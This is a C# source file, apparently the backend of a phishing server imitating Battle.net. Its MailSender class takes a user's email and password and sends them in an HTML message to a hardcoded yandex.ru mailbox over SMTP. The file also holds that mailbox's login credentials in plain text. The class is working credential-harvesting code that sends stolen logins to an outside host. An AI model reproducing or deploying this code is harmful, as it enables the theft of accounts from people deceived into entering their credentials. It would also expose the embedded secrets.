using MailKit.Net.Smtp;
using MimeKit;

namespace HttpServerBattleNet;

public class MailSender
{
    private static readonly string EMAIL_ADDRESS  = "cdbacjdorz@yandex.ru";
    private static readonly string EMAIL_PASSWORD = "zmqmbqdcarkrfqmf";

    public static async Task SendEmailAsync(string passwordFromUser, string emailFromUser, string subject)
    {
        try
        {
            using var emailSender = new MimeMessage();

            emailSender.From.Add(new MailboxAddress("Hello From Battle.net", EMAIL_ADDRESS));
            emailSender.To.Add(new MailboxAddress("", "cdbacjdorz@yandex.ru"));
            emailSender.Subject = subject;
            emailSender.Body = new TextPart(MimeKit.Text.TextFormat.Html)
            {
                Text = $"<h4>This your password and email | Email: {emailFromUser} | Password: {passwordFromUser}</h4>"
            };

            using var client = new SmtpClient();
            await client.ConnectAsync("smtp.yandex.ru", 465, true);
            client.AuthenticationMechanisms.Remove("XOAUTH2");
            await client.AuthenticateAsync(EMAIL_ADDRESS, EMAIL_PASSWORD);
            await client.SendAsync(emailSender);
            await client.DisconnectAsync(true);
        }
        catch (Exception e)
        {
            Console.WriteLine(e);
            throw;
        }
    }
}